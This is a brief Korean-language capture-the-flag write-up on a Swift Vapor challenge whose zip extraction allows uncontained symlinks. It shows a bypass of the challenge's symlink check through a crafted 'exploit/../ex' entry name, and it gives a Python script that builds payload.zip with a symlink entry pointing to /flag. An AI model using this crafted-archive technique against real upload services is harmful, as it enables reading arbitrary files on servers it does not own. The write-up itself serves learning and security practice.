- 솔직히 다른 사람(한별님)이 푼거라 정확히 이해 안됨 수정 예정

# 분석
1. swift의 vapor 프레임워크사용
2. leaf 라는 템플릿언어 사용
3. zip인지 아닌지, symlink인지 아닌지 판별하는 로직 있음
4. `allowUncontainedSymlinks: true` 이게 너무 수상

[https://github.com/weichsel/ZIPFoundation/issues/282](https://github.com/weichsel/ZIPFoundation/issues/282 "https://github.com/weichsel/ZIPFoundation/issues/282")
해당 이슈 보면 allowUncontainedSymlinks가 true일 경우 symbolic link를 걸어둔 파일을 zip으로 압축하면 압축이 해제되면서 설정한 symlink 경로와 연결된다고 함

```
try fileManager.unzipItem(at: sourceURL, to: destinationURL, allowUncontainedSymlinks: true)
```

- symbolic link가 걸려있는 파일이 검출되면 자동으로 삭제하는 mitigation이 있는데

```
func GetEntryListInZipFile(fileName: String) throws -> [String] {
  ...
var components = entry.path.components(separatedBy: "/")
components = components.filter { $0 != ".." }
```

- 이 함수에서 받아온 리스트로 하나씩 symbolic이 걸려있는지 판별
- `result = [a, b, c]` 라고 하면 a, b, c 각각을 판단
- 함수에서 취약점이 존재해 ``exploit/../ex`` 이런식으로 작성하면 entrylist가` exploit/ex`로 줄어들어서 리스트를 오염할 수 있음
- e.g. 실제 파일은 exploit/ ex 리스트는` ["exploit/ex"]` 따라서 검사를 우회하고 익스 가능함

```python
import zipfile

def compress_file(filename):
    zipInfo = zipfile.ZipInfo(".")
    zipInfo.create_system = 3
    zipInfo.external_attr = 2716663808
    zipInfo.filename = filename

    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(zipInfo, "/flag")

filename = 'exploit/../ex'

compress_file(filename)
```

[Symlink path traversal vulnerability · Issue #282 · weichsel/ZIPFou...](https://github.com/weichsel/ZIPFoundation/issues/282)